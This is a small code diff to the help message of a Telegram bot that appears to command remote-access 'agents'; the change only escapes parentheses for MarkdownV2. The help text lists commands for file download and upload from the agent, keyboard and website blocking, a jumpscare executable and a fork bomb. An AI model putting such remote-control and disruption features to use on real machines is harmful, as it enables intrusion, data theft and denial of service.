@@ -151,7 +151,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "  *Effects: invert, noise, lines, color\\_squares*\n"
         "`/stopflashscreen` \\- Stop the visual effect\n"
         "`/jumpscare` \\- 👻 Run the bundled jumpscare executable\n\n"
-        "*🚫 LOCKDOWN & CONTROL (Admin)*\n"
+        "*🚫 LOCKDOWN & CONTROL \\(Admin\\)*\n"
         "`/blockwebsite <url>` \\- Block website access\n"
         "`/unblockwebsite <domain>` \\- Unblock a website\n"
         "`/blockkeyboard` \\- Disable keyboard input\n"
@@ -167,7 +167,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/pwd` \\- Show current directory\n"
         "`/download <file>` \\- Download a file from the agent\n"
         "`/upload` \\- Reply to a file to upload it\n\n"
-        "*💣 DESTRUCTIVE & ADVANCED (Admin)*\n"
+        "*💣 DESTRUCTIVE & ADVANCED \\(Admin\\)*\n"
         "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
         "`/cancelforkbomb` \\- Stop the fork bomb\n"
         "`/destroy <id> CONFIRM` \\- Uninstall the agent\n"
@@ -175,7 +175,6 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/restore <key>` \\- Placeholder restore command\n"
     )
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
-
 # --- Register all command handlers ---
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("list", cmd_list_agents))
